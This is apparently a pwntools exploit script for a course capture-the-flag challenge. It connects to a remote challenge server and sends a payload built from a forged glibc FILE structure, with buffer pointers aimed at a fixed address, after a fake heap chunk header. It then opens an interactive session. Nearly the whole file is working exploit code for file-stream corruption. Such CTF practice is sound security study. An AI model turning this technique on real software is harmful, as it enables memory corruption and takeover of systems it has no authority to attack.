from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
#r = process('./chal')
r = remote('edu-ctf.zoolab.org', 10009)


write_base = 0x404070
size = 0x50
fileStr = FileStructure()
fileStr.flags = 0xfbad0000
fileStr._IO_buf_base = write_base
fileStr._IO_write_base = write_base
fileStr._IO_buf_end = write_base + size
fileStr._IO_read_ptr = 0x0
fileStr._IO_read_end = 0x0
fileStr.fileno = 0x0
#print(fileStr)
payload = (flat(0,0,0,0x1e1) +  bytes(fileStr))[0:19*0x8]

r.sendline(payload)
#gdb.attach(r)
r.interactive()